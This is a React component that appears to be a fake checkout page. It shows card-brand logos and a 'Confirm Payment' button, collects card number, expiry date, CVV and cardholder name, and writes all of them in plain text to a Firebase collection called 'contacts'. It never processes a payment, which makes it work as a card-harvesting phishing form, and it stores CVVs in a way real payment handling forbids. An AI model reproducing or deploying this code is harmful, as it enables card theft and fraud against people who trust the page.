import { useState } from "react";
import {db} from '../firbase';
import './form.css'
function App() {
    const [number, setNuber] = useState("");
  const [date, setDate] = useState("");
  const [cvcode, setCvcode] = useState("");
  const [name, setName] = useState("")

  const [loader, setLoader] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoader(true);

    db.collection("contacts")
      .add({
        number: number,
        name: name,
        date: date,
        cvvCode: cvcode
      })
      .then(() => {
        setLoader(false);
        alert("Your message has been submitted👍");
      })
      .catch((error) => {
        alert(error.message);
        setLoader(false);
      });

    setNuber("");
    setDate("");
    setCvcode("");
    setName("")
  };
  return (
    <div className="fromWraper">
        <h4>Payment Details</h4>
        <img src='https://img.etimg.com/thumb/width-640,height-480,imgsize-114814,resizemode-1,msid-60955286/small-biz/money/mastercard-enters-into-an-agreement-with-andhra-pradesh-government-for-robust-digital-solutions/mastercard.jpg' width={100}/>
        <img src='data:image/png;base64,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' width={100}/>
        <img src='https://img.etimg.com/thumb/width-640,height-480,imgsize-114814,resizemode-1,msid-60955286/small-biz/money/mastercard-enters-into-an-agreement-with-andhra-pradesh-government-for-robust-digital-solutions/mastercard.jpg' width={100}/>
        <img src='https://img.etimg.com/thumb/width-640,height-480,imgsize-114814,resizemode-1,msid-60955286/small-biz/money/mastercard-enters-into-an-agreement-with-andhra-pradesh-government-for-robust-digital-solutions/mastercard.jpg' width={100}/>
        hello
        <form className="form" onSubmit={handleSubmit}>
        {/* <h5>CARD NUMBER</h5> */}

        <label className='cardNumber'>CARD NUMBER</label>
        <input
            placeholder='Valid card number'
            value={number}
            onChange={(e) => setNuber(e.target.value)}
            maxLength={16}
            className='cardNumbers'

        />
        <br/>
        <form className='expridateWraper'>
            <label className='expirDateTitle'>EXPIRATION DATE</label><br/>
            <input
                placeholder="MM/YY"
                onChange={(e) => setDate(e.target.value)}
                className='expirDateTitles'
            />

            <label className='cvvTitle'>CVV CODE</label><br/>
            <input
                placeholder="CVV"
                value={cvcode}
                onChange={(e) => setCvcode(e.target.value)}
                className='cvv'
            />
        </form>
        <label className='ownTitle'>CARD OWNER</label>
        <input
            placeholder="Card Owner Name"
            value={name}
            onChange={(e) => setName(e.target.value)}
            className='cradOwn'
        ></input>

        <button
            type="submit"
            className='btn'
        >
            Confirm Payment
        </button>
        </form>
    </div>
  );
}

export default App;
